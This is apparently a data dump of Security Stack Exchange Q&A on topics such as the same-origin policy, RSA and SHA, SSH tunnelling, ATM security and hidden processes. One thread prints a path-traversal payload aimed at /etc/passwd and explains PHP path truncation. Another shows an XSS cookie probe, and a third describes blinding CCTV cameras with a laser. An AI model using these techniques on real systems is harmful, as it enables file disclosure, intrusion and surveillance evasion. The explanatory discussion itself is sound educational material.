"Why is the same origin policy so important?","48766","","<p>I can't really fully understand what <em>same origin domain</em> means. I know it means that when getting a resource from another domain (say a JS file) it will run from the context of the domain that serves it (like Google Analytics code), which means it can't modify the data or read the data on the domain that ""includes the resource"".</p>

<p>So if domain <code>a.com</code> is embedding a js file from <code>google.com</code> in its source, that js will run <em>from</em> <code>google.com</code> and it can't access the DOM\cookies\any other element on <code>a.com</code> -- am I right?</p>

<p>Here is a definition for the same origin policy which I can't really understand:</p>

<blockquote>
  <p>The same-origin policy is a key mechanism implemented within browsers
  that is designed to keep content that came from different origins from
  interfering with each other. Basically, content received from one
  website is allowed to read and modify other content received from the
  same site but is not allowed to access content received from other
  sites.</p>
</blockquote>

<p>What does that really mean? Can you please give me a real life example?</p>

<p>Another question is: what is the purpose of Origin header and how do cross domain requests still exist? Why doesn't it influence the security or the same origin policy?</p>
","<h2>Why is the same origin policy important?</h2>

<p>Assume you are logged into Facebook and visit a malicious website in another browser tab. Without the same origin policy JavaScript on that website could do anything to your Facebook account that you are allowed to do. For example read private messages, post status updates, analyse the HTML DOM-tree after you entered your password before submitting the form.</p>

<p>But of course Facebook wants to use JavaScript to enhance the user experience. So it is important that the browser can detect that this JavaScript is trusted to access Facebook resources. That's where the same origin policy comes into play: If the JavaScript is included from a HTML page on facebook.com, it may access facebook.com resources.</p>

<p>Now replace Facebook with your online banking website, and it will be obvious that this is an issue.</p>

<h2>What is the origin?</h2>

<blockquote>
  <p>I can't really fully understand what same origin domain means. I know it means that when getting a resource from another domain (say a JS file) it will run from the context of the domain that serves it (like google analytics code), which means it can't modify the data or read the data on the domain that ""includes the resource"".</p>
</blockquote>

<p>This is not correct: The origin of a JavaScript file is defined by the domain of the HTML page which includes it. So if you include the Google Analytics code with a &lt;script&gt;-tag, it can do anything to your website but does not have same origin permissions on the Google website.</p>

<h2>How does cross domain communication work?</h2>

<p>The same origin policy is not enforced for all requests. Among others the &lt;script&gt;- and &lt;img&gt;-tags may fetch resources from any domain. Posting forms and linking to other domains is possible, too. Frames and iframes way display information from other domains but interaction with that content is limited.</p>

<p>There are some approaches to allow XMLHttpRequest (ajax) calls to other domains in a secure way, but they are not well supported by common browsers. The common way to enable communication with another domain is <a href=""http://en.wikipedia.org/wiki/JSONP"">JSONP</a>:</p>

<p>It is based on a &lt;script&gt;-tag. The information, which shall be sent to another domain, is encoded in the URL as parameters. The returned JavaScript consists of a function call with the requested information as parameter:</p>

<pre><code>&lt;script type=""text/javascript"" src=""http://example.com/
     ?some-variable=some-data&amp;jsonp=parseResponse""&gt;
&lt;/script&gt;
</code></pre>

<p>The dynamically generated JavaScript from example.com may look like:</p>

<pre><code>parseResponse({""variable"": ""value"", ""variable2"": ""value2""})
</code></pre>

<h2>What is Cross Site Scripting?</h2>

<p><a href=""http://en.wikipedia.org/wiki/Cross-site_scripting"">Cross Site Scripting</a> is a <strong>vulnerability</strong> that allows an attacker to inject JavaScript code into a website, so that it originates from the attacked website from the browser point of view.</p>

<p>This can happen if user input is not sufficiently sanitised. For example a search function may display the string ""Your search results for [userinput]"". If [userinput] is not escaped an attacker may search for:</p>

<pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</code></pre>

<p>The browser has no way to detect that this code was not provided by the website owner, so it will execute it. Nowadays cross site scripting is a major issue, so there is work done to prevent this vulnerability. Most notable is the <a href=""https://dvcs.w3.org/hg/content-security-policy/raw-file/bcf1c45f312f/csp-unofficial-draft-20110303.html"">Content Security Policy</a> approach.</p>
","8269"
"SHA, RSA and the relation between them","48724","","<p>SHA is the hashing mechanism. However, RSA is the encryption algorithm.</p>

<p>So does RSA algorithm use SHA hashing mechanism to generate hashing keys which in turn is used to encrypt the message??</p>

<p>Moreover, RSA itself gives 2 keys. One can be kept public and one private. Now, these keys can be used to encrypt as well as decrypt. Ref : <a href=""http://en.wikipedia.org/wiki/RSA_%28algorithm%29"">RSA</a>. Then what is the use of SHA in RSA? </p>

<p>In a certificate given by any site that gives HTTPS security, there is an SHA as well as a MD5 key present. How are these produced and used in the eccryption or decryption of data transferred to the browser?</p>
","<p><a href=""http://en.wikipedia.org/wiki/RSA_%28algorithm%29"">RSA</a> is actually two algorithms, one for asymmetric encryption, and one for digital signatures (the signature algorithm is traditionally -- but incorrectly -- described as ""encryption with the private key"" and this is an endless source of confusion).</p>

<p><strong>Asymmetric encryption</strong> uses keys. Keys are parameters to the algorithm; the algorithm itself is the same for everybody (in software terms, it is the executable file) while keys vary between users. In a <em>key pair</em>, the <em>public key</em> is the key which is used to <em>encrypt</em> data (convert a piece of data, i.e. a sequence of bytes, into another sequence of bytes which is unfathomable for everybody) while the <em>private key</em> is the key which allows one to <em>decrypt</em> data (i.e. reverse the encryption). In symmetric encryption, the encryption and decryption keys are identical, but with asymmetric encryption, the encryption and decryption keys are distinct from each other (hence the name); they are mathematically linked together, but it should be unfeasible (i.e. too hard to do with a mere bunch of computers) to recover the decryption key from the encryption key. This is why the encryption key can be made public while the decryption key is kept private: revealing the public key does not reveal the private key.</p>

<p>What asymmetric encryption achieves is no trivial feat. The possibility to reveal the public key while not saying too much about the private key, but such that both keys work together (what is encrypted with the public key can be decrypted by the corresponding private key, but none other), requires a lot of mathematics. RSA is full of maths. This contrasts with symmetric encryption algorithms which are ""just"" ways to make a big mess of data by mixing bits together.</p>

<p>Asymmetric encryption is the natural tool to use when we want to allow for confidential transmissions between any two users among a big population. If you have 1000 users, and you want any two users to be able to exchange data with each other without allowing anybody to spy of them (including the 998 other users), then the classical solution would be to distribute keys for symmetric encryption to every <em>pair</em> of users. Alice and Bob would have a known, common key; Alice and Charlie would also have a shared key (not the same); and so would Bob and Charlie; and so on. Each user would need to remember his ""shared key"" with every single one of the 999 other users, and you would have 499500 keys in total. Adding a 1001th user would involve creating 1000 additional symmetric keys, and give one to each of the 1000 existing users. The whole key distribution soon turns into an unusable nightmare. With <em>asymmetric encryption</em>, things are simpler: every user just has to remember his own private key, and the public keys, being public, can be distributed through some sort of broadcasting (e.g. a directory).</p>

<p>RSA has some operational constraints. With the most used variant (the one known as <a href=""http://www.rsa.com/rsalabs/node.asp?id=2125"">PKCS#1 v1.5</a>), if the size of the RSA key is ""1024 bits"" (meaning that the central mathematical component of the key pair is a 1024-bit integer), then RSA can encrypt a message up to 117 bytes in length, and yields an encrypted message of length 128 bytes. That limited size, and the size increase when encrypting, are unavoidable consequences of the mathematical structure of the RSA encryption process. Due to these constraints, we do not usually encrypt data <em>directly</em> with RSA; instead, we select a small sequence of random bytes, which we call <em>session key</em>. We encrypt the session key with RSA; and then we use the session key with a <em>symmetric</em> encryption algorithm to process the whole message. This is called <a href=""http://en.wikipedia.org/wiki/Hybrid_cryptosystem"">hybrid encryption</a>.</p>

<hr />

<p><a href=""http://en.wikipedia.org/wiki/Secure_Hash_Algorithm"">SHA</a> is the common name for a family of <a href=""http://en.wikipedia.org/wiki/Cryptographic_hash_function"">cryptographic hash functions</a>. The very first member of that family was described under the name 'SHA' but was soon deprecated after a serious weakness was found in it; a fixed version was published under the name 'SHA-1' (the weak version is colloquially known as 'SHA-0'). Four new SHA-like functions were added to the family later on (SHA-224, SHA-256, SHA-384 and SHA-512, collectively known as 'SHA-2').</p>

<p><strong>Hash functions have no key.</strong> A hash function is an executable algorithm which is pure code. There is <em>one</em> SHA-1 and everybody uses the same.</p>

<p>Hash functions ""just"" make a big mess of the input data, which is not meant to be unraveled. Actually, it is meant to be resilient to unraveling. Even though everybody knows all that is to be known about a hash function (there is no key, only code, and nothing of it is secret), it still turns out to be ""too hard"" to recompute a matching input message, given the hash function output. It is even unfeasible to find two distinct input messages which, when given to the hash function, yield the same output; there <em>must</em> exist such pairs of messages -- called <em>collisions</em> -- because a hash function output has a fixed small size, while accepted inputs can be widely larger, so there are more possible inputs than possible outputs. It is a mathematical certainty that collisions exist for every hash function, but actually finding one is quite another matter.</p>

<p>A hash function, as itself, does not do anything of immediate high value, but it is a very important building block for other algorithms. For instance, they are used with <a href=""http://en.wikipedia.org/wiki/Digital_signature"">digital signatures</a>. A digital signature ""proves"" conscious action of a designated signer over a piece of data; like asymmetric encryption, this involves key pairs and mathematics, and associated constraints on the signed data. A hash function <em>h</em> is such that signing <em>h(m)</em> is as good as signing <em>m</em> itself: since it is unfeasible to find two distinct messages which hash to the same value, approval of the hash output is enough. The point being that the <em>output</em> of the hash function is small enough to be usable with the maths hidden in the signature algorithm, even if the message itself is big (SHA-1 can process gigabytes of data, and yields a 20-byte output).</p>

<p>It can be noted that some recent variants of RSA-the-encryption-algorithm (with the 'OAEP padding' from PKCS#1 v2.0) internally use hash functions. Hash functions are good ""randomizers"" (the output of a hash function does not exhibit recognizable structure) and this makes them appropriate for building more elaborate cryptographic algorithms with good security features.</p>

<hr />

<p>In <a href=""http://tools.ietf.org/html/rfc5246"">SSL/TLS</a> (HTTPS is just HTTP-within-a-SSL/TLS-tunnel), hash functions are used for several things:</p>

<ul>
<li>as part of asymmetric encryption and/or digital signatures;</li>
<li>as part of <a href=""http://en.wikipedia.org/wiki/HMAC"">HMAC</a> to allow client and server to verify that exchanged data has not been altered in transit;</li>
<li>as a building brick for a <a href=""http://en.wikipedia.org/wiki/Key_derivation_function"">Key Derivation Function</a>, which ""expands"" a given session key into several symmetric keys used for symmetric encryption and integrity checks in both directions of the tunnel.</li>
</ul>

<p>The KDF relies on the ""randomizing"" and non-invertibility of the hash function. In SSL/TLS up to TLS 1.1, the KDF is built over <em>two</em> hash functions, MD5 and SHA-1, in an attempt to make it robust even if weaknesses were later found in either MD5 or SHA-1. It turns out that weaknesses were found in <em>both</em>, but it did not allow any break on the KDF as used in SSL/TLS. Nevertheless, TLS 1.2 switched to another KDF which uses a single, configurable hash function, usually SHA-256, for which no weakness is currently known.</p>
","9265"
"How can I tunnel through an SSH server for application layer protocols such as HTTP/s and FTP?","48708","","<p>Are there client programs that allow me to ""tunnel"" through my SSH enabled server for normal Internet requests such as HTTP(s)?</p>

<p>If so what are they and can someone point me in the right direction?</p>

<p>Note: I'm not asking about a VPN; I'm specifically asking if its possible to ""tunnel"" a connection through SSH.</p>
","<p>Most SSH clients will do that for you. With the <code>ssh</code> client provided with any good Linux system, simply type:</p>

<pre><code>ssh -D 5000 -N theservername
</code></pre>

<p>where <code>theservername</code> is the name of the SSH server to which you want to tunnel the requests. Then set your Web browser to use <code>localhost</code>, on port 5000, as SOCKS proxy. And voila! all your HTTP and HTTPS requests will go through the SSH tunnel and exit on the other side.</p>

<p>For Windows, <a href=""http://www.chiark.greenend.org.uk/~sgtatham/putty/"">PuTTY</a> can also be <a href=""http://blog.ashurex.com/2012/03/15/creating-ssh-proxy-tunnel-putty/"">used as a SOCKS proxy</a>.</p>
","31228"
"What is the best practice: separate ssh-key per host and user VS one ssh-key for all hosts?","48675","","<p>Is it better to create a separate ssh-key for each host and user or just using the id_rsa key for all host to authenticate? Could one <strong>id_rsa</strong> be a malpractice for the privacy/anonymity policies?</p>

<h1>Update:</h1>

<p>having one ssh-key for all hosts:</p>

<pre><code>~/.ssh/id_rsa
~/.ssh/id_rsa.pub
</code></pre>

<p>in comparison to separate ssh-keys:</p>

<pre><code>~/.ssh/user1_host1
~/.ssh/user1_host1.pub
~/.ssh/user2_host1
~/.ssh/user2_host1.pub
~/.ssh/user3_host2
~/.ssh/user3_host2.pub
~/.ssh/user4_host3
~/.ssh/user4_host3.pub
... etc.
</code></pre>
","<p>A private key corresponds to a single ""identity"" for a given user, whatever that means to you. If, to you, an ""identity"" is a single person, or a single person on a single machine, or perhaps a single instance of an application running on a single machine. The level of granularity is up to you. </p>

<p>As far as security is concerned, you don't <em>compromise</em> your key in any way by using it to log in on a machine (as you would by using a password), so having separate keys for separate destinations doesn't make you any more safe from an authentication/security perspective.</p>

<p>Though having the same key authorized for multiple machines does prove that the same key-holder has access to both machines from a forensic perspective. Typically that's not an issue, but it's worth pointing out.</p>

<p>Also, the more places a single key is authorized, the more valuable that key becomes. If that key gets compromised, more targets are put at risk.</p>

<p>Also, the more places the <em>private</em> key is stored (say, your work computer, your laptop, and your backup storage, for example), the more places there are for an attacker to go to grab a copy. So that's worth considering as well.</p>

<p>As for universally-applicable guidelines on how to run your security: there are none. The more additional security you add, the more convenience you give up. The one piece of advice I <strong>can</strong> give categorically is this: <strong>keep your private key encrypted.</strong> The added security there is pretty significant.</p>
","40061"
"Is there any way to tell if CCTV is on or not?","48638","","<p>Is there any way that an attacker can identify if a CCTV camera is on/operational without direct physical access to the cable/camera?</p>

<p>If it is on, is there any way an attacker can tell if its being viewed/recorded or not with access to the camera/cables but no access to the recording/viewing rooms?</p>
","<p>This would really depend on whether you care or not of being detected in the process and how much you're willing to invest into equipment, but sure. Provided there aren't some other, obvious signs the camera is on, such as the pan and tilt motors working</p>

<ul>
<li><p><strong>Low-tech approach</strong>: This is actually really similar to how doctors test patients for <a href=""https://en.wikipedia.org/wiki/Pupillary_light_reflex"">involuntary reflex reaction</a> with a light source directed in patients' eyes and observing dilation (or lack thereof) of their pupils.<br /><br />Most well designed CCTV cameras would have what is called an <strong>Auto Iris (AI)</strong>. Basically an automatic method of varying the size of a lens aperture, to allow the correct amount of light to fall on the imaging device. The lens would include a tiny motor and an amplifier, which are used to maintain a desired voltage video signal as produced by varying levels of light falling on its image sensor.<br /><br />By changing the level of light this camera's AI sensor receives, you could visually inspect the camera's iris movement even from an angle it can not record you (depending on its depth of field), or even audibly inspect the presence of such AI motor. Since these would be precision step (or stepper) motors, you would hear either a distinct buzz of it rotating, or the faint click when it's adjusted its step. Beware though, some <a href=""http://www.extremetech.com/extreme/130740-canon-quiets-video-af-critics-with-ultra-quiet-stepper-motor-lenses"">ultra silent stepper motors have been developed</a> already, tho I have yet to see CCTV cameras actually using them.<br /><br />Similar testing could be applied to other camera's components (e.g. auto-focus), with varying degree of how stealthy the tester could remain during this testing.</p></li>
<li><p><strong>High-tech approach</strong>: This is easy and rather obvious - electronic bug detectors are capable of detecting compromising emanations (basically EMI: <code>RF -&gt; microwave -&gt; IR</code> fields in their descending wavelength / increasing frequency). Obviously they would all have some way of telling you which direction the compromising emanations are originating from, and most also at what specific frequencies and their exact strength.<br /><br />Such devices are getting fairly cheap nowadays, and you can buy pretty decently capable ones off local resellers for up to a few hundred dollars, or even a second-hand one for roughly a quarter of that price off online resellers. Since the choice is fairly good, I won't give you any links to specific products, not wanting to endorse any specific manufacturer.<br /><br />This detection would work both for wired, as well as wireless CCTV cameras. Wired CCTV systems would produce what is called a <em>ballanced signal</em> when on, which is a video signal that has been converted to enable it to be transmitted along <em>'twisted pair'</em> cables, while the wireless (RF, or less common IR that require direct line of sight from the camera to the receiver) CCTV systems are even more apparent and would transmit higher energy radiation in their specified range (on top of compromising emanations from its internal circuitry).</p></li>
</ul>

<p>Now, the other part of your question - detecting, <strong>if the video/audio feed is actually being recorded</strong> - is a bit more tricky to answer and would greatly depend on what system we're talking of here: </p>

<ul>
<li><p>Analogue recording systems (rare nowadays) would actually add a bit more latency to the EM field emanating closed-loop when switched on (producing feedback spike in sine wave oscillation), basically moving the signal termination point a bit further on the power line (or separate signal cable, if not combined). This might, or might not be detectable by your equipment. Mind you, I do mean here only the exact moment when the recording device is switched on or off, and you would have a lot harder time detecting which state it's on, if it's in continuous mode of operation. Knowing the system beforehand and actually measuring its signal levels when on/off would obviously help.</p></li>
<li><p>Digital CCTV systems are a fair bit trickier to detect, if they're actually recording or not. In fact, you wouldn't be able to tell the difference between merely a receiver being on, or the recording system also doing its job that's connected to the receiver. With a bit of luck, you'd be dealing with direct-controllable IP cameras that would have a <a href=""https://en.wikipedia.org/wiki/Variable_bitrate"">variable bit-rate (VBR)</a> A/V feed encoder chip. This change in required bit-rate can be detected by better electronic bug detectors, but knowing the change in detectable EMI for the exact CCTV system beforehand would be of great help. With <a href=""https://en.wikipedia.org/wiki/Constant_bitrate"">CBR</a>/<a href=""https://en.wikipedia.org/wiki/Average_bitrate"">ABR</a> (constant or average bit-rate) encoders, you'd most probably be out of luck though.</p></li>
</ul>

<p>Now, I didn't write anything about disabling them, since you're not really inquiring about that, but maybe just a quick note that it's actually getting easier the more <em>advanced</em> they get, and with most new ones all you need is a decent pocket/torch size <a href=""https://en.wikipedia.org/wiki/Laser#Solid-state_lasers"">green laser</a> (532 nm) directed for a few seconds directly into their <a href=""https://en.wikipedia.org/wiki/Charge-coupled_device"">CCD</a>/<a href=""https://en.wikipedia.org/wiki/Active_pixel_sensor"">CMOS</a> sensor. The higher their resolution, the faster they will <em>give up</em>, depending also on laser's Watt rating, how much light diffraction are we talking of due to lens elements arrangement, their focal point, e.t.c. On wireless systems, you could actually detect their sensor's death by observing a sudden drop in compromising emanations intensity (camera's onboard video compression would be at its best with all the images of some framerate being the same, thus lowering the wireless frequency transmissions, i.e. lowering bandwidth).</p>

<p>Just mind, that CCTV cameras might be a whole lot more than cameras only, and pack audible and/or activity (movement / proximity / pressure change / presence of other  compromising emanations / ...) detection sensors as well. And the most funny of all (to me, as I wouldn't really care of being detected or not) is being highly equipped for any eventuality, but then unwittingly manage to disturb some wildlife (bats, birds, rodents,...) with your presence, that would fright and trigger the CCTV system's response for you.</p>
","37687"
"How can I use this path bypass/exploit Local File Inclusion?","48471","","<p>I have tried to run a vulnerability scanning script (Uniscan 6.0) on some websites and then I found a site which is exploitable with this following path. (included a word ""invalid"" , params/website are both censored)</p>

<pre><code>http://www.website.com/index.php?param1=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.&amp;param2=value&amp;param3=value
</code></pre>

<p>For my next step, I really want to understand what exactly happen so I'm trying to manually exploit it. (I took a look at some tutorials about LFI)</p>

<ol>
<li>../../../../../../../../../../../../../../../etc/passwd&amp;...</li>
<li>invalid../../../../../../../../../../../../../../../etc/passwd&amp;...</li>
<li>../../../../../../../../../../../../../../../etc/passwd%00&amp;...</li>
<li>../../../../../../../../../../../../../../../etc/passwd/././&amp;...</li>
<li>../../../../../../../../../../../../../../../etc/passwd%00/././%...</li>
</ol>

<p>but they didn't work except the first very long path, what is going on? </p>

<p>What php-code should I use?
And how that long path could bypass that vulnerable php-code?</p>

<p>The following information may be helpful.</p>

<pre><code>&lt; HTTP/1.1 200 OK
&lt; Date: Thu, 19 Jul 2012 19:46:03 GMT
&lt; Server: Apache/2.2.3 (CentOS)
&lt; X-Powered-By: PHP/5.1.6
&lt; Set-Cookie: PHPSESSID=[blah-blah]; path=/
&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
&lt; Pragma: no-cache
&lt; Vary: Accept-Encoding
&lt; Content-Length: 2094
&lt; Content-Type: text/html
</code></pre>
","<p>Fascinating!  @catalyze has dug up a truly intriguing, lovely situation here.  I wanted to take the time to summarize what's going on here, on this site.  (Full credits to @catalyze and Francesco ""ascii"" Ongaro; I'm just summarizing what they explained.)</p>

<p><strong>Summary.</strong> This is not an everyday LFI attack.  Instead, this is something more unusual and clever.  Here we have a vulnerability that cannot be exploited through standard LFI methods; you need more trickiness to work out how to exploit it.</p>

<p><strong>Background.</strong> First, I need to tell you two facts about PHP's file handling that were discovered by Francesco ""ascii"" Ongaro and others:</p>

<ul>
<li><p><strong>Fact 1.  You can add stuff to the end of a filename.</strong> Everyone knows that <code>/./etc/passwd</code> is just another way to refer to the <code>/etc/passwd</code> file.  But, here are some you may not have known about.</p>

<p>On PHP, it turns out that <code>/etc/passwd/</code> also refers to the <code>/etc/passwd</code> file: trailing slashes are stripped off.  Wild, huh?  This doesn't work on base Unix, so it is a bit surprising that PHP would accept such a filename, but it appears that PHP is itself stripping off trailing slashes before opening the file.</p>

<p>You can append any number of trailing slashes: <code>/etc/passwd////</code> is also OK.</p>

<p>And, you can append <code>./</code> (as many times as you want).  For instance, <code>/etc/passwd/.</code>, <code>/etc/passwd/./</code>, and <code>/etc/passwd/././.</code> all refer to <code>/etc/passwd</code>.  Go nuts!  PHP doesn't care.</p></li>
<li><p><strong>Fact 2. Long paths are truncated.</strong> On most PHP installations, if the filename is longer than 4096 bytes, it will be silently truncated and everything after the first 4096 bytes will be discarded.  No error is triggered: the excess characters are simply thrown away and PHP happily continues on.</p></li>
</ul>

<p><strong>The attack.</strong> Now I am ready to describe the attack.  I'll show you the vulnerable code, why standard LFI attacks don't work, and then how to build a more-clever attack that does work.  The result explains what @catalyze saw in his pentest.</p>

<p><strong>The vulnerable code.</strong> Suppose we have code that looks something like this:</p>

<pre><code>&lt;?php
include(""includes/"".$_GET['param1']."".php"");
?&gt;
</code></pre>

<p>This looks like a local file include (LFI) vulnerability, right?  But the situation is actually a bit trickier than it may at first appear.  To see why, let's look at some attacks.</p>

<p><strong>Standard attacks.</strong> The standard, naive way to try to exploit this LFI vulnerability is to supply a parameter looking something like <code>?param1=../../../../var/www/shared/badguy/evil</code>.  The above PHP code will then try to include the file <code>includes/../../../../var/www/shared/badguy/evil.php</code>.  If we assume that the file <code>/var/www/shared/badguy/evil.php</code> exists and is controlled by the attacker, then this attack will succeed at causing the application to execute malicious code chosen by the attacker.</p>

<p>But this only works if the attacker can introduce a file with contents of his choice onto the filesystem, with a filename ending in <code>.php</code>.  What if the attacker doesn't control any file on the filesystem which ends in <code>.php</code>?  Well, then, the standard attacks will fail.  No matter what parameter value the attacker supplies, this is only going to open a filename that ends with the <code>.php</code> extension.</p>

<p><strong>A more sophisticated attack.</strong> With the additional background facts I gave you earlier, maybe you can see how to come up with a more sophisticated attack that defeats this limitation.</p>

<p>Basically, the attacker chooses a very long parameter value, so that the constructed filename is longer than 4096 bytes long.  When the filename is truncated, the <code>.php</code> extension will get thrown away.  And if the attacker can arrange for the resulting filename to refer to an existing file on the filesystem, the attacker is good.</p>

<p>Now this might sound like a far-fetched attack.  What are the odds that we can find a filename on the filesystem whose full path happens to be exactly 4096 bytes long?  Maybe not so good?</p>

<p>This is where the background facts come into play.  The attacker can send a request with <code>?param1=../../../../etc/passwd/./././././&lt;...&gt;</code> (with the <code>./</code> pattern repeated many thousands of times).  Now look at what filename gets included, after the prefix is prepended and the <code>.php</code> file extension is added: it will be something like <code>includes/../../../../etc/passwd/./././././&lt;...&gt;.php</code>.  This filename will be longer than 4096 bytes, so it will get truncated.  The truncation will drop the file extension and leave us with a filename of the form <code>includes/../../../../etc/passwd/./././././&lt;...&gt;</code>.  And, thanks to the way PHP handles trailing slashes and trailing <code>./</code> sequences, all that stuff at the end will be ignored.  In other words, this filename will be treated by PHP as equivalent to the path <code>includes/../../../../etc/passwd</code>.  So PHP will try to read from the password file, and when it finds PHP syntax errors there, it may dump the contents of the password file into an error page -- disclosing secret information to an attacker.</p>

<p>So this technique allows to exploit some vulnerabilities that otherwise could not be exploited through standard methods.  See the pages that @catalyze links to for a more detailed discussion and many other examples.</p>

<p>This also explains why @catalyze was not able to exploit the attack by sending something like <code>?param1=../../../../etc/passwd</code>: a <code>.php</code> extension got added on, and the file <code>/etc/passwd.php</code> did not exist, so the attack failed.</p>

<p><strong>Summary.</strong> Peculiarities in PHP's handling of file paths enable all sorts of subtle attacks on vulnerabilities that otherwise would appear unexploitable.  For pentesters, these attack techniques may be worth knowing about.</p>

<p>For developers, the lesson is the same: validate your inputs; don't trust inputs supplied by the attacker; know about classic web vulnerabilities, and don't introduce them into your code.</p>
","17807"
"Where does SSL encryption take place?","48347","","<p>I checked the data transmission of an HTTPS website (gmail.com) using Firebug. But  I can't see any encryption to my submitted data (username and password). Where does SSL encryption take place? </p>
","<p>The SSL protocol is implemented as a transparent wrapper around the HTTP protocol. In terms of the <a href=""http://en.wikipedia.org/wiki/OSI_model"">OSI model</a>, it's a bit of a grey area. It is usually implemented in the application layer, but strictly speaking is in the session layer.</p>

<p>Think of it like this:</p>

<ol>
<li>Physical layer (network cable / wifi)</li>
<li>Data link layer (ethernet)</li>
<li>Network layer (IPv4)</li>
<li>Transport layer (TCP)</li>
<li><strong>Session layer (SSL)</strong></li>
<li>Presentation layer (none in this case)</li>
<li>Application layer (HTTP)</li>
</ol>

<p>Notice that SSL sits between HTTP and TCP.</p>

<p>If you want to see it in action, grab <a href=""http://www.wireshark.org/"">Wireshark</a> and browse a site via HTTP, then another via HTTPS. You'll see that you can read the requests and responses on the HTTP version as plain text, but not the HTTPS ones. You'll also be able to see the layers that the packet is split into, from the data link layer upwards.</p>

<p><strong>Update</strong>: It has been pointed out (see comments) that the OSI model is an over-generalisation and does not fit very well here. This is true. However, the use of this model is to demonstrate that SSL sits ""somewhere"" in between TCP and HTTP. It is not strictly accurate, and is a vague abstraction of reality.</p>
","19685"
"How to find processes that are hidden from task manager","48152","","<p>I have read that you can hide processes from the task manager, <a href=""https://security.stackexchange.com/questions/48184/hiding-process-from-task-manager"">example here</a></p>

<p>I've seen a few posts on hidden keyloggers using rootkit but that's it really.</p>

<p>Is there a tool or way to look at processes being run even though they have been hidden?</p>
","<p>This really depends on how the process is hidden.  If certain Windows API functions are hooked, then process managers using those functions will not see the process.  So it's dependent on the particular piece of software trying to hide as well as the monitoring software trying to find it.  Regardless of which monitoring program you use you're not guaranteed to find all processes running.  That being said there are a couple of good tools out there.  </p>

<p><a href=""http://technet.microsoft.com/en-us/sysinternals/bb842062"">SysInternals Suite</a> has multiple different monitoring programs.  Process Explorer is very nice from a GUI perspective.  It also links into VirusTotal to let you know if any currently running processes it sees is known to be malicious.  Procmon is awesome for process monitoring.  It bases its output off of Windows API file/registry/network function calls.  The downside is that the output is massive, and you generally have to know what you're looking for.  But if a hidden process is accessing the registry, files, or communicating over the network it would be shown here.</p>

<p>There's an open source monitor called <a href=""http://yaprocmon.sourceforge.net/help_static.html"">YaProcmon</a> (Yet Another Process Monitor) that has a feature that specifically looks for process hiding mechanisms, and attempts to expose them.  </p>
","76111"
"How is an ATM secure?","48074","","<p>I'm curious why an ATM computer is considered secure.  The general adage of ""If an attacker has physical access to my machine, all bets are off,"" seems to not apply in this circumstance (since <em>everyone</em> has physical access to the machine).  Why is this?</p>

<p>I thought of the fact that many have security cameras placed over them, but this doesn't seem sufficient to keep ATMs secure, as there is no one constantly watching the camera feed and looking for suspicious behavior.  The most this could be used for is identifying an attacker after an attack has been attempted.  It seems like this is fairly easily solved through plain clothes, a mask, gloves, etc.</p>

<p>So if this alone isn't or shouldn't be enough of a deterrent, why do we not see ATMs getting hacked for all their cash at 4:00am?  What makes the device so secure?  Is it just a simple risk-reward analysis, where the cash in the ATM isn't worth the effort of the hack?  Or is there more to it which makes the computer secure?</p>

<p>Also, I noted that there have been a couple questions about ATM security (like <a href=""https://security.stackexchange.com/questions/29908/what-security-standards-and-regulations-are-in-place-for-bank-atm"">this one</a> and <a href=""https://security.stackexchange.com/questions/25564/how-to-spoof-an-atm-transaction"">this one</a>), but mine is about the <em>physical</em> security of the machine, since it violates a common security principle, not anything network related.</p>
","<p>I think the assumption here is wrong.  They don't have physical access to the machine.  They have supervised access to a very limited control panel for a machine which is built into a bomb-proof safe, bolted to the ground and hooked up to an alarm system with an armed response force.</p>

<p>Get the machine out of the vault and away from supervision and then yes... all bets are off.</p>
","32923"
"Is howsecureismypassword.net safe to use?","47912","","<p>Is it safe to enter my real passwords to test them?</p>

<p>I mean, are the entered passwords being recorded/transmitted to someone else?</p>
","<p>Ha, this question has been asked about quadrillion nonagintillion times but in regards to rainbow tables. But in this case, the answer is that it is safe to enter password because it's not transmitted to the another site.</p>

<p>It does only client-side calculations in javascript, so it doesnt transfer any passwords outside the browser to perform server-side storage or something like this.</p>

<p>However if the website is hacked, you will be out of luck.</p>

<p>The website should be really identified with valid cert as well it should publish how they protect their server, because the password website is very likely to be hacked this way.</p>

<p>As this one looks running some sort of LAMP, might be vulnerable to file overwrite or sql injection statistically. It should be really static page, and from what it looks, will eventually get hacked and modified with the password logger.</p>
","17501"
